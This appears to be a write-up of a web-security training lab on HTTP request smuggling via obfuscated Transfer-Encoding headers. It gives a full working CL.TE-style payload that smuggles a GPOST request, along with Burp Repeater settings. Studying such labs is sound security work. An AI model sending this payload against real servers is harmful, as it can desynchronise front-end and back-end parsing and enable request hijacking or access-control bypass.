# HTTP Request Smuggling — Obfuscating the TE Header


## Lab Goal


The front-end server only accepts `GET` and `POST` methods.


The goal is to **smuggle a request to the back-end server** so that the next request processed by the back-end uses the method:


```http

GPOST

```


## Core Concept


The vulnerability is caused by a difference in how the **front-end and back-end handle duplicate HTTP headers**.


We use two `Transfer-Encoding` headers with different casing:


```http

Transfer-Encoding: chunked

Transfer-encoding: cow

```


This is called **TE header obfuscation**.


The value `cow` is not a valid transfer encoding. It is used to create a difference in how the two servers parse the headers.



## Payload



```http

POST / HTTP/1.1

Host: TARGET

Content-Type: application/x-www-form-urlencoded

Content-Length: 4

Transfer-Encoding: chunked

Transfer-encoding: cow



5c

GPOST / HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 15



x=1

0


```


## How It Works



The important part is the smuggled request:



```http
GPOST / HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 15


x=1

```



The objective is to make the **back-end interpret this data as a separate HTTP request**.



The result is:



```text

Front-end
    ↓

Parses the request one way

    ↓

Back-end

    ↓

Parses the request differently

    ↓

Smuggled request

    ↓

GPOST / HTTP/1.1

```


## Why `cow`?



`cow` is **not required for chunked encoding itself**.



It is used as part of the **TE obfuscation technique** to exploit the different handling of duplicate `Transfer-Encoding` headers.



Without the obfuscation:



```http

Content-Length: 4

Transfer-Encoding: chunked

```



both servers may interpret the request consistently.



With the duplicate/obfuscated TE headers, their parsing behavior can differ, enabling request smuggling.


## Important




The intended solution requires **HTTP/1**.



In Burp Repeater:



```text

Inspector

→ Request attributes

→ Protocol

→ HTTP/1
```


## Key Terms



* **HTTP Request Smuggling** — exploiting differences in request parsing between front-end and back-end servers.

* **TE Obfuscation** — modifying the `Transfer-Encoding` header representation to bypass parsing inconsistencies.

* **Duplicate Headers** — sending the same HTTP header more than once.

* **Parser Discrepancy** — different servers interpreting the same request differently.

* **Request Desynchronization** — front-end and back-end become out of sync about request boundaries.



### Reference



[PortSwigger Web Security Academy — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling?utm_source=chatgpt.com)

